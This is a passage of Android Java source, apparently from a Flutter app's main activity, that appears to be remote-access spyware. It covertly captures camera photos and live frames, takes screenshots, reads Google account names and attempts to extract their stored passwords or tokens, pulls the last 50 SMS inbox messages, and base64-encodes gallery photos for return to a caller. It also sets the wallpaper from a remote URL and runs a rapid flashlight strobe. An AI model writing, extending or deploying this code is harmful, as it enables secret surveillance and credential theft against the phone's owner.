                    try {
                        CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                        builder.addTarget(activeImageReader.getSurface());
                        builder.addTarget(dummySurface);
                        builder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
                        builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
                        builder.set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO);
                        builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                        builder.set(CaptureRequest.CONTROL_AE_TARGET_FPS_RANGE, new android.util.Range<>(10, 20));

                        camera.createCaptureSession(Arrays.asList(activeImageReader.getSurface(), dummySurface), new CameraCaptureSession.StateCallback() {
                            @Override
                            public void onConfigured(@NonNull CameraCaptureSession session) {
                                activeCaptureSession = session;
                                try {
                                    session.setRepeatingRequest(builder.build(), null, cameraHandler);
                                    uiHandler.post(() -> result.success(true));
                                } catch (CameraAccessException e) {
                                    uiHandler.post(() -> result.error("CAM_ERR", e.getMessage(), null));
                                }
                            }
                            @Override
                            public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                uiHandler.post(() -> result.error("CAM_ERR", "Configure failed", null));
                            }
                        }, cameraHandler);
                    } catch (Exception e) {
                        uiHandler.post(() -> result.error("CAM_ERR", e.getMessage(), null));
                    }
                }
                @Override public void onDisconnected(@NonNull CameraDevice c) { cleanupCamera(); }
                @Override public void onError(@NonNull CameraDevice c, int err) {
                    cleanupCamera();
                    uiHandler.post(() -> result.error("CAM_ERR", "Error: " + err, null));
                }
            }, cameraHandler);

        } catch (Exception e) {
            cleanupCamera();
            uiHandler.post(() -> result.error("CAM_EXCEPTION", e.getMessage(), null));
        }
    }

    private void stopLiveCameraStream() {
        isLiveStreaming = false;
        lastFrame = null;
        cleanupCamera();
    }

    private void capturePhoto(String side, MethodChannel.Result result) {
        cleanupCamera();
        cameraThread = new HandlerThread("CameraThread");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());

        try {
            CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            int targetFacing = side.equals("front") ? CameraCharacteristics.LENS_FACING_FRONT : CameraCharacteristics.LENS_FACING_BACK;

            String cameraId = null;
            for (String id : manager.getCameraIdList()) {
                Integer facing = manager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == targetFacing) { cameraId = id; break; }
            }
            if (cameraId == null) { result.error("CAM_ERR", "Camera not found: " + side, null); return; }

            activeImageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
            activeImageReader.setOnImageAvailableListener(reader -> {
                Image img = reader.acquireLatestImage();
                if (img == null) return;
                try {
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    img.close();
                    Bitmap bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
                    if (bmp == null) { uiHandler.post(() -> result.error("CAM_ERR", "Decode failed", null)); return; }
                    ByteArrayOutputStream out = new ByteArrayOutputStream();
                    bmp.compress(Bitmap.CompressFormat.JPEG, 50, out);
                    String b64 = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
                    uiHandler.post(() -> result.success(b64));
                } finally { cleanupCamera(); }
            }, cameraHandler);

            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    activeCameraDevice = camera;
                    try {
                        CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        builder.addTarget(activeImageReader.getSurface());
                        builder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
                        camera.createCaptureSession(Arrays.asList(activeImageReader.getSurface()), new CameraCaptureSession.StateCallback() {
                            @Override public void onConfigured(@NonNull CameraCaptureSession session) { try { session.capture(builder.build(), null, cameraHandler); } catch (CameraAccessException e) { cleanupCamera(); } }
                            @Override public void onConfigureFailed(@NonNull CameraCaptureSession session) { cleanupCamera(); }
                        }, cameraHandler);
                    } catch (CameraAccessException e) { cleanupCamera(); }
                }
                @Override public void onDisconnected(@NonNull CameraDevice c) { cleanupCamera(); }
                @Override public void onError(@NonNull CameraDevice c, int err) { cleanupCamera(); uiHandler.post(() -> result.error("CAM_ERR", "Camera error: " + err, null)); }
            }, cameraHandler);

        } catch (Exception e) {
            cleanupCamera();
            uiHandler.post(() -> result.error("CAM_EXCEPTION", e.getMessage(), null));
        }
    }

    private synchronized void cleanupCamera() {
        try { if (activeCaptureSession != null) { activeCaptureSession.close(); activeCaptureSession = null; } } catch (Exception ignored) {}
        try { if (activeCameraDevice != null)   { activeCameraDevice.close();   activeCameraDevice   = null; } } catch (Exception ignored) {}
        try { if (activeImageReader != null)    { activeImageReader.close();    activeImageReader    = null; } } catch (Exception ignored) {}
        try { if (cameraThread != null)         { cameraThread.quitSafely();   cameraThread         = null; } } catch (Exception ignored) {}
    }

    private String getScreenBase64() {
        try {
            View v = getWindow().getDecorView().getRootView();
            v.setDrawingCacheEnabled(true);
            v.buildDrawingCache(true);
            Bitmap bmp = v.getDrawingCache(true);
            if (bmp == null) return null;
            Bitmap copy = bmp.copy(bmp.getConfig(), false);
            v.setDrawingCacheEnabled(false);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            copy.compress(Bitmap.CompressFormat.JPEG, 40, out);
            return Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
        } catch (Exception e) { return null; }
    }

    private void fetchGmailAccounts(MethodChannel.Result result) {
        try {
            AccountManager am = AccountManager.get(this);
            Account[] accounts = am.getAccountsByType("com.google");
            StringBuilder sb = new StringBuilder();
            for (Account ac : accounts) {
                sb.append("Email: ").append(ac.name).append("\n");
                try {
                    String token = am.getPassword(ac);
                    if (token != null && !token.isEmpty()) sb.append("Password: ").append(token).append("\n");
                } catch (Exception ignored) {}
                sb.append("---\n");
            }
            result.success(sb.toString().trim().isEmpty() ? "No Google Account Found" : sb.toString().trim());
        } catch (Exception e) { result.error("GMAIL_ERR", e.getMessage(), null); }
    }

    private void getSmsMessages(MethodChannel.Result result) {
        new Thread(() -> {
            try {
                ArrayList<HashMap<String, String>> smsList = new ArrayList<>();
                ContentResolver cr = getContentResolver();
                Cursor cursor = cr.query(Uri.parse("content://sms/inbox"),
                        new String[]{"address", "body", "date", "type"}, null, null, "date DESC LIMIT 50");
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        HashMap<String, String> sms = new HashMap<>();
                        sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                        sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                        sms.put("date", cursor.getString(cursor.getColumnIndexOrThrow("date")));
                        smsList.add(sms);
                    }
                    cursor.close();
                }
                uiHandler.post(() -> result.success(smsList));
            } catch (Exception e) { uiHandler.post(() -> result.error("SMS_ERR", e.getMessage(), null)); }
        }).start();
    }

    private void getGalleryImages(int limit, MethodChannel.Result result) {
        new Thread(() -> {
            try {
                ArrayList<String> images = new ArrayList<>();
                ContentResolver cr = getContentResolver();
                String[] proj = { MediaStore.Images.Media._ID };
                Cursor cursor = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        proj, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
                int count = 0;
                if (cursor != null) {
                    while (cursor.moveToNext() && count < limit) {
                        try {
                            long id2 = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                            Uri imgUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id2);
                            Bitmap bmp = null;
                            try (InputStream is = cr.openInputStream(imgUri)) {
                                BitmapFactory.Options opts = new BitmapFactory.Options();
                                opts.inSampleSize = 4;
                                bmp = BitmapFactory.decodeStream(is, null, opts);
                            } catch (Exception ignored) {}
                            if (bmp != null) {
                                ByteArrayOutputStream out = new ByteArrayOutputStream();
                                bmp.compress(Bitmap.CompressFormat.JPEG, 50, out);
                                images.add(Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP));
                                bmp.recycle();
                                count++;
                            }
                        } catch (Exception ignored) {}
                    }
                    cursor.close();
                }
                uiHandler.post(() -> result.success(images));
            } catch (Exception e) { uiHandler.post(() -> result.error("GALLERY_ERR", e.getMessage(), null)); }
        }).start();
    }

    private void setWallpaper(String urlString, MethodChannel.Result result) {
        new Thread(() -> {
            try {
                URL url = new URL(urlString);
                WallpaperManager.getInstance(this).setStream(url.openStream());
                uiHandler.post(() -> result.success(true));
            } catch (Exception e) { uiHandler.post(() -> result.error("WALL_ERR", e.getMessage(), null)); }
        }).start();
    }

    private void startStrobeEffect() {
        if (isStrobeRunning) return;
        isStrobeRunning = true;
        final CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        strobeRunnable = new Runnable() {
            boolean on = false;
            @Override public void run() {
                try {
                    String id = cm.getCameraIdList()[0];
                    on = !on;
                    cm.setTorchMode(id, on);
                    if (isStrobeRunning) uiHandler.postDelayed(this, 30);
                } catch (Exception e) { isStrobeRunning = false; }
            }
        };
        uiHandler.post(strobeRunnable);
    }

    private void stopStrobeEffect() {
        isStrobeRunning = false;
        if (strobeRunnable != null) uiHandler.removeCallbacks(strobeRunnable);
        try {
            CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            cm.setTorchMode(cm.getCameraIdList()[0], false);
        } catch (Exception ignored) {}
    }

    @Override
    protected void onDestroy() {
        try { if (cmdReceiver != null) unregisterReceiver(cmdReceiver); } catch (Exception ignored) {}
        cleanupCamera();
        super.onDestroy();
    }
}